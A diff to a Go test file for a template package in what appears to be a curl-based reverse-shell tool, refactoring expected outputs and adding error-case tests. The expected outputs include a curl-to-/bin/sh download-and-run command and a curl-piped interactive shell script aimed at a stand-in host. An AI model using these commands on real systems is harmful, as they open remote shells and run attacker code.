@@ -5,7 +5,7 @@ package crstemplate
  * Tests for crstemplate.go
  * By J. Stuart McMurray
  * Created 20241212
- * Last Modified 20241222
+ * Last Modified 20250111
  */
 
 import (
@@ -53,6 +53,19 @@ func TestExecute(t *testing.T) {
 		}
 	)
 	const haveNoFile = "TEST_NO_FILE" /* Don't make a file. */
+	const (                           /* Default template output. */
+		defaultCallback = "curl -sk --pinnedpubkey sha256//" +
+			"testFPtestFPtestFPtestFPtestFPtestFPtestFPx= " +
+			"https://testURL.test:4444/testC | /bin/sh"
+		defaultFiles = "curl -sk --pinnedpubkey sha256//" +
+			"testFPtestFPtestFPtestFPtestFPtestFPtestFPx= " +
+			"https://testURL.test:4444"
+		defaultScript = `#!/bin/sh
+curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testI/testID -N  </dev/null 2>&0 |
+/bin/sh 2>&1 |
+curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testO/testID -T- >/dev/null 2>&1
+`
+	)
 	/* Make sure we don't miss anything if we've added a field later. */
 	if got := firstEmptyField(params, ""); "" != got {
 		t.Fatalf("Field %s unset in params", got)
@@ -67,36 +80,32 @@ func TestExecute(t *testing.T) {
 	cs := map[string]testC{
 		SubtemplateCallback + "/empty": {
 			name: SubtemplateCallback,
-			werr: ErrNoSubtemplates,
+			want: defaultCallback,
 		},
 		SubtemplateFiles + "/empty": {
 			name: SubtemplateFiles,
-			werr: ErrNoSubtemplates,
+			want: defaultFiles,
 		},
 		SubtemplateScript + "/empty": {
 			name: SubtemplateScript,
-			werr: ErrNoSubtemplates,
+			want: defaultScript,
 		},
 		SubtemplateCallback + "/no_file": {
 			name: SubtemplateCallback,
 			have: haveNoFile,
-			want: "curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testC | /bin/sh",
+			want: defaultCallback,
 			werr: fs.ErrNotExist,
 		},
 		SubtemplateFiles + "/no_file": {
 			name: SubtemplateFiles,
 			have: haveNoFile,
-			want: "curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444",
+			want: defaultFiles,
 			werr: fs.ErrNotExist,
 		},
 		SubtemplateScript + "/no_file": {
 			name: SubtemplateScript,
 			have: haveNoFile,
-			want: `#!/bin/sh
-curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testI/testID -N  </dev/null 2>&0 |
-/bin/sh 2>&1 |
-curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testO/testID -T- >/dev/null 2>&1
-`,
+			want: defaultScript,
 			werr: fs.ErrNotExist,
 		},
 		SubtemplateCallback + "/overridden": {
@@ -113,6 +122,36 @@ curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= htt
 			name: SubtemplateScript,
 			have: `{{define "script"}}ID: {{.ID}}{{end}}`,
 			want: "ID: " + testID,
+		},
+		SubtemplateCallback + "/not_subtemplate": {
+			name: SubtemplateCallback,
+			have: `kittens`,
+			werr: ErrOutsideSubtemplate,
+		},
+		SubtemplateFiles + "/not_subtemplate": {
+			name: SubtemplateFiles,
+			have: `kittens`,
+			werr: ErrOutsideSubtemplate,
+		},
+		SubtemplateScript + "/not_subtemplate": {
+			name: SubtemplateScript,
+			have: `kittens`,
+			werr: ErrOutsideSubtemplate,
+		},
+		SubtemplateCallback + "/extraneous_subtemplate": {
+			name: SubtemplateCallback,
+			have: `{{define "kittens"}}ID: {{.ID}}{{end}}`,
+			want: defaultCallback,
+		},
+		SubtemplateFiles + "/extraneous_subtemplate": {
+			name: SubtemplateFiles,
+			have: `{{define "kittens"}}ID: {{.ID}}{{end}}`,
+			want: defaultFiles,
+		},
+		SubtemplateScript + "/extraneous_subtemplate": {
+			name: SubtemplateScript,
+			have: `{{define "kittens"}}ID: {{.ID}}{{end}}`,
+			want: defaultScript,
 		},
 	}
 	for n, c := range cs {
